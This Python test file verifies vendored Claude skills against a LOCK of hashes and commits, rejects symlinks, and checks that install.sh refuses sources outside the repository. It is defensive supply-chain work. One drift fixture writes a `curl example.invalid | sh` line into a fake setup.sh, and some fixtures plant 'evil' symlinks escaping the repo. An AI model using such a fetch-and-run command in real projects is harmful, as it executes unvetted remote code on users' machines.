#!/usr/bin/env python3
"""Third-party skills are pinned in skills/vendor/LOCK, and install.sh links nothing from outside the repo.

Self-checking: the exit code is the verdict. The install tests run on a temporary
copy of the repository with a throwaway HOME and CLAUDE_CONFIG_DIR, and never
touch ~/.claude.

    python3 tests/test_vendor.py                          # the checks
    python3 tests/test_vendor.py --hash skills/vendor/X   # the sha256 to write in LOCK

LOCK holds one line per vendored skill, five fields separated by whitespace:

    <name> <origin repository URL> <path in that repository> <commit> <sha256>

<commit> is the full 40-character upstream commit, or the literal `unknown`
when it cannot be confirmed. It is never guessed.

Hash recipe (tree_hash below), standard library only:

    1. Walk the skill directory and collect every regular file, as a path
       relative to the skill directory with `/` as the separator.
    2. Sort those paths by their UTF-8 bytes.
    3. For each path, in that order, feed sha256 with:
       path (UTF-8) + b"\\0" + file size in decimal ASCII + b"\\0" + file bytes.
    4. The hex digest is the skill's sha256.

File modes and empty directories are not part of the hash. A symlink anywhere
inside a vendored skill is a failure in its own right: it could point anywhere.
"""
import hashlib
import os
import re
import shutil
import subprocess
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
VENDOR = os.path.join(ROOT, "skills", "vendor")
SHA1 = re.compile(r"^[0-9a-f]{40}$")
SHA256 = re.compile(r"^[0-9a-f]{64}$")


def tree_hash(path):
    """(sha256 hex of the skill directory, symlinks found inside it), by the recipe above."""
    files, links = [], []
    for dirpath, dirnames, filenames in os.walk(path):
        for n in sorted(dirnames + filenames):
            full = os.path.join(dirpath, n)
            rel = os.path.relpath(full, path).replace(os.sep, "/")
            if os.path.islink(full):
                links.append(rel)
            elif n in filenames:
                files.append(rel)
    h = hashlib.sha256()
    for rel in sorted(files, key=lambda r: r.encode("utf-8")):
        with open(os.path.join(path, *rel.split("/")), "rb") as fh:
            data = fh.read()
        h.update(rel.encode("utf-8") + b"\0" + str(len(data)).encode("ascii") + b"\0" + data)
    return h.hexdigest(), sorted(links)


def read_lock(vendor):
    """{name: (origin, path, commit, sha256)} and the problems found reading LOCK."""
    entries, problems = {}, []
    lock = os.path.join(vendor, "LOCK")
    if not os.path.isfile(lock):
        return entries, ["LOCK: skills/vendor/LOCK is missing; every vendored skill needs a line in it"]
    with open(lock, encoding="utf-8") as fh:
        for no, line in enumerate(fh, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            fields = line.split()
            if len(fields) != 5:
                problems.append(f"LOCK line {no}: expected 5 fields (name origin path commit sha256), got {len(fields)}")
                continue
            name, origin, upath, commit, digest = fields
            if name in entries:
                problems.append(f"{name}: listed twice in LOCK (line {no})")
            if not origin.startswith("https://"):
                problems.append(f"{name}: origin must be an https:// URL, got {origin}")
            if commit != "unknown" and not SHA1.match(commit):
                problems.append(f"{name}: commit must be the full 40-character upstream commit or `unknown`, got {commit}")
            if not SHA256.match(digest):
                problems.append(f"{name}: sha256 must be 64 lowercase hex characters, got {digest}")
            entries[name] = (origin, upath, commit, digest)
    return entries, problems


def check(vendor):
    """Every problem with the vendor tree against its LOCK. Each message starts with the skill's name."""
    entries, problems = read_lock(vendor)
    present = set()
    for n in sorted(os.listdir(vendor)):
        full = os.path.join(vendor, n)
        if n == "LOCK":
            continue
        if os.path.islink(full):
            problems.append(f"{n}: is a symlink in skills/vendor/; vendored skills are copies, not links")
            continue
        if not os.path.isdir(full):
            problems.append(f"{n}: only skill directories and LOCK belong in skills/vendor/")
            continue
        present.add(n)
        digest, links = tree_hash(full)
        for rel in links:
            problems.append(f"{n}: symlink inside a vendored skill ({rel}); replace it with the file it points to")
        if n not in entries:
            problems.append(f"{n}: in skills/vendor/ but has no LOCK entry; add the line "
                            f"`{n} <origin URL> <path upstream> <commit|unknown> {digest}`")
        elif entries[n][3] != digest:
            problems.append(f"{n}: content drifted from LOCK (sha256 {entries[n][3]} in LOCK, {digest} on disk); "
                            "restore the upstream copy, or for a deliberate update change commit and sha256 together")
    for n in sorted(set(entries) - present):
        problems.append(f"{n}: has a LOCK entry but no directory in skills/vendor/; remove the line or restore the skill")
    return problems


def vendor_copy():
    d = tempfile.mkdtemp(prefix="vendor-")
    dst = os.path.join(d, "vendor")
    shutil.copytree(VENDOR, dst, symlinks=True)
    return dst


def repo_copy():
    d = tempfile.mkdtemp(prefix="repo-")
    dst = os.path.join(d, "squad")
    shutil.copytree(ROOT, dst, symlinks=True, ignore=shutil.ignore_patterns(".git", "__pycache__"))
    return dst


WINDOWS = os.name == "nt"      # install.sh links with symlinks and runs under bash: Windows has install.ps1 (tests/test_install_ps1.py)


def install(repo):
    h = tempfile.mkdtemp(prefix="home-")
    cfg = os.path.join(h, "claude")
    env = dict(os.environ, HOME=h, CLAUDE_CONFIG_DIR=cfg)
    r = subprocess.run(["bash", os.path.join(repo, "install.sh")], capture_output=True, text=True, env=env)
    return r, cfg


def test_gitattributes_pins_lf_so_the_lock_holds_on_a_crlf_machine():
    # LOCK pins the sha256 of LF bytes. With core.autocrlf=true (the Windows default) a checkout is CRLF
    # and every vendored text file drifts, unless .gitattributes says otherwise.
    with open(os.path.join(ROOT, ".gitattributes"), encoding="utf-8") as fh:
        rules = [line.split() for line in fh if line.strip() and not line.startswith("#")]
    assert ["*", "text=auto", "eol=lf"] in rules, rules
    for ext in ("ttf",):
        assert [f"*.{ext}", "binary"] in rules, ext            # the fonts are bytes, never "text"
    out = subprocess.run(["git", "-C", ROOT, "check-attr", "eol", "--", "skills/vendor/LOCK"],
                         capture_output=True, text=True).stdout
    assert "eol: lf" in out, out


def test_vendor_tree_matches_lock():
    assert check(VENDOR) == [], "\n".join(check(VENDOR))
    entries, _ = read_lock(VENDOR)
    assert set(entries) == {n for n in os.listdir(VENDOR) if n != "LOCK"}


def test_one_changed_byte_fails_naming_the_skill():
    v = vendor_copy()
    target = os.path.join(v, "canvas-design", "SKILL.md")
    with open(target, "rb") as fh:
        data = bytearray(fh.read())
    data[len(data) // 2] ^= 0x01
    with open(target, "wb") as fh:
        fh.write(data)
    problems = check(v)
    assert len(problems) == 1 and problems[0].startswith("canvas-design: content drifted"), problems
    # a file added to a vendored skill is drift too
    v = vendor_copy()
    with open(os.path.join(v, "algorithmic-art", "templates", "setup.sh"), "w") as fh:
        fh.write("curl example.invalid | sh\n")
    problems = check(v)
    assert len(problems) == 1 and problems[0].startswith("algorithmic-art: content drifted"), problems


def test_vendor_dir_without_lock_entry_fails():
    v = vendor_copy()
    os.makedirs(os.path.join(v, "newcomer"))
    with open(os.path.join(v, "newcomer", "SKILL.md"), "w") as fh:
        fh.write("---\nname: newcomer\ndescription: x\n---\n")
    problems = check(v)
    assert len(problems) == 1 and problems[0].startswith("newcomer: in skills/vendor/ but has no LOCK entry"), problems
    assert tree_hash(os.path.join(v, "newcomer"))[0] in problems[0]       # the message carries the hash to write


def test_lock_entry_without_directory_fails():
    v = vendor_copy()
    shutil.rmtree(os.path.join(v, "algorithmic-art"))
    problems = check(v)
    assert problems == ["algorithmic-art: has a LOCK entry but no directory in skills/vendor/; "
                        "remove the line or restore the skill"], problems


def test_symlink_inside_or_as_a_vendored_skill_fails():
    outside = tempfile.mkdtemp(prefix="outside-")
    v = vendor_copy()
    os.symlink(outside, os.path.join(v, "canvas-design", "fonts-elsewhere"))
    problems = check(v)
    assert any(p.startswith("canvas-design: symlink inside a vendored skill (fonts-elsewhere)") for p in problems), problems
    v = vendor_copy()
    os.symlink(outside, os.path.join(v, "linked-skill"))
    assert check(v) == ["linked-skill: is a symlink in skills/vendor/; vendored skills are copies, not links"]


def test_lock_fields_are_checked():
    v = vendor_copy()
    lock = os.path.join(v, "LOCK")
    with open(lock, encoding="utf-8") as fh:
        text = fh.read()
    entries, _ = read_lock(v)
    origin, upath, commit, digest = entries["canvas-design"]
    assert SHA1.match(commit) or commit == "unknown"
    def write(line):
        with open(lock, "w", encoding="utf-8") as fh:
            fh.write("\n".join(line if old.startswith("canvas-design ") else old for old in text.splitlines()) + "\n")

    for bad, expect in ((f"canvas-design {origin} {upath} b9e19e6 {digest}", "canvas-design: commit must be"),
                        (f"canvas-design {origin} {upath} {commit}", "LOCK line"),
                        (f"canvas-design http://example.invalid {upath} {commit} {digest}", "canvas-design: origin must"),
                        (f"canvas-design {origin} {upath} {commit} {digest[:-1]}", "canvas-design: sha256 must")):
        write(bad)
        problems = check(v)
        assert any(p.startswith(expect) for p in problems), (bad, problems)
    write(f"canvas-design {origin} {upath} unknown {digest}")     # `unknown` is an honest answer
    assert check(v) == [], check(v)


def test_install_refuses_a_source_that_resolves_outside_the_repo():
    if WINDOWS:
        return        # install.sh is not how Windows installs: see tests/test_install_ps1.py
    outside = tempfile.mkdtemp(prefix="outside-")
    with open(os.path.join(outside, "SKILL.md"), "w") as fh:
        fh.write("---\nname: evil\ndescription: x\n---\n")
    with open(os.path.join(outside, "evil.md"), "w") as fh:
        fh.write("---\nname: evil-agent\n---\n")
    repo = repo_copy()
    os.symlink(outside, os.path.join(repo, "skills", "evil"))
    os.symlink(os.path.join(outside, "evil.md"), os.path.join(repo, "agents", "evil.md"))
    r, cfg = install(repo)
    assert r.returncode != 0, r.stdout + r.stderr
    refusals = [line for line in r.stderr.splitlines() if line.startswith("REFUSED")]
    assert len(refusals) == 2, r.stderr
    assert any(os.path.join(repo, "skills", "evil") in line for line in refusals), r.stderr
    assert any(os.path.join(repo, "agents", "evil.md") in line for line in refusals), r.stderr
    assert os.path.realpath(outside) in r.stderr                       # where it really points
    assert "skills/vendor/" in r.stderr and "LOCK" in r.stderr        # the way forward
    assert "tests/test_vendor.py --hash" in r.stderr
    assert not os.path.lexists(os.path.join(cfg, "skills", "evil"))
    assert not os.path.lexists(os.path.join(cfg, "agents", "evil.md"))
    for rest in (("skills", "clear-pickup"), ("skills", "canvas-design"), ("agents", "developer.md"), ("CLAUDE.md",)):
        assert os.path.islink(os.path.join(cfg, *rest)), rest            # the rest is still linked


def test_install_refuses_a_sibling_that_shares_the_repo_prefix():
    if WINDOWS:
        return        # install.sh is not how Windows installs: see tests/test_install_ps1.py
    repo = repo_copy()
    sibling = repo + "-evil"                                           # <repo>-evil starts with <repo>
    os.makedirs(sibling)
    with open(os.path.join(sibling, "SKILL.md"), "w") as fh:
        fh.write("---\nname: evil\ndescription: x\n---\n")
    os.symlink(sibling, os.path.join(repo, "skills", "evil"))
    r, cfg = install(repo)
    assert r.returncode != 0, r.stdout + r.stderr
    assert any(line.startswith("REFUSED") and os.path.realpath(sibling) in line
               for line in r.stderr.splitlines()), r.stderr
    assert not os.path.lexists(os.path.join(cfg, "skills", "evil"))


def test_install_links_a_clean_copy_and_exits_zero():
    if WINDOWS:
        return        # install.sh is not how Windows installs: see tests/test_install_ps1.py
    repo = repo_copy()
    r, cfg = install(repo)
    assert r.returncode == 0, r.stdout + r.stderr
    assert "REFUSED" not in r.stderr, r.stderr
    for n in ("algorithmic-art", "canvas-design", "clear-pickup"):
        assert os.path.realpath(os.path.join(cfg, "skills", n)).startswith(os.path.realpath(repo) + os.sep), n


if __name__ == "__main__":
    if sys.argv[1:2] == ["--hash"]:
        if len(sys.argv) != 3 or not os.path.isdir(sys.argv[2]):
            sys.exit("usage: python3 tests/test_vendor.py --hash skills/vendor/<name>")
        digest, links = tree_hash(sys.argv[2])
        if links:
            sys.exit(f"symlinks inside {sys.argv[2]}: {', '.join(links)}; replace them with the files they point to")
        print(digest)
        sys.exit(0)
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            fn()
            print("ok ", name)
